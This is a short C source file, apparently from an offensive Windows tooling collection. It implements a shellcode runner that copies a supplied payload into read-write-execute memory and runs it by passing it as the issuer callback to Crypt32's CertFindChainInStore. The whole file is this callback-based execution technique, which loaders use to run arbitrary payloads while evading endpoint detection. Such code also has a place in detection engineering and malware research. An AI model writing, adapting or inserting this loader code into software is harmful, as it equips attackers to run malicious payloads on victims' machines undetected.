#include "Win32Helper.h"

DWORD UnusedSubroutineDisposeableThreadCertFindChainInStore(LPVOID Param)
{
	PSHELLCODE_EXECUTION_INFORMATION Sei = (PSHELLCODE_EXECUTION_INFORMATION)Param;
	LPVOID BinAddress = NULL;
	HMODULE hModule = NULL;
	BOOL bFlag = FALSE;
	CERTOPENSTORE CertOpenStore = NULL;;
	HCERTSTORE hCertStore = NULL;
	CERTFINDCHAININSTORE CertFindChainInStore = NULL;;
	CERTCLOSESTORE CertCloseStore = NULL;;
	CERT_CHAIN_FIND_ISSUER_PARA ChainFind = { 0 };

	hModule = TryLoadDllMultiMethodW((PWCHAR)L"Crypt32.dll");
	if (!hModule)
		goto EXIT_ROUTINE;

	CertOpenStore = (CERTOPENSTORE)GetProcAddressA((DWORD64)hModule, "CertOpenStore");
	CertFindChainInStore = (CERTFINDCHAININSTORE)GetProcAddressA((DWORD64)hModule, "CertFindChainInStore");
	CertCloseStore = (CERTCLOSESTORE)GetProcAddressA((DWORD64)hModule, "CertCloseStore");

	if (!CertOpenStore || !CertFindChainInStore || !CertCloseStore)
		goto EXIT_ROUTINE;

	BinAddress = VirtualAlloc(NULL, Sei->dwLengthOfPayloadInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		goto EXIT_ROUTINE;

	CopyMemoryEx(BinAddress, Sei->Payload, Sei->dwLengthOfPayloadInBytes);

	hCertStore = CertOpenStore(CERT_STORE_PROV_SYSTEM_W, 0, NULL, CERT_SYSTEM_STORE_CURRENT_USER, (PVOID)L"My");
	if (hCertStore == NULL)
		goto EXIT_ROUTINE;

	ChainFind.pfnFindCallback = (PFN_CERT_CHAIN_FIND_BY_ISSUER_CALLBACK)BinAddress;
	ChainFind.cbSize = sizeof(CERT_CHAIN_FIND_BY_ISSUER_PARA);

	CertFindChainInStore(hCertStore, X509_ASN_ENCODING, 0, CERT_CHAIN_FIND_BY_ISSUER, &ChainFind, NULL);

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hModule)
		FreeLibrary(hModule);

	if (BinAddress)
		VirtualFree(BinAddress, 0, MEM_RELEASE);

	return (bFlag ? 0 : 0xffffffff);
}


BOOL _unstable__ShellcodeExecViaCertFindChainInStore(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei)
{
	return CreateThreadAndWaitForCompletion(UnusedSubroutineDisposeableThreadCertFindChainInStore, Sei, INFINITE);
}
